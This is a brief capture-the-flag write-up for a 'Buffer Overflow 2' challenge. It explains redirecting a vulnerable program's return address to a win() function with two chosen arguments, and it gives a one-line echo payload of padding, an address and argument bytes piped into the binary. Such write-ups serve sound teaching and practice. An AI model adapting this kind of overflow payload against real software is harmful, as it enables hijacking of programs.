# Buffer Overflow 2
Alright, this time you'll need to control some arguments. Can you get the flag from this program?

## Solution
This problem required a carefully crafted input what set the return pointer to the `win()` function and also set the the arguments to be `arg1 = 0xDEADBEEF` and `arg2 = 0xDEADC0DE`, respectfully.

### Exploit
```
echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE\xcb\x85\x04\x08abcd\xef\xbe\xad\xde\xde\xc0\xad\xde" | ./vuln
```
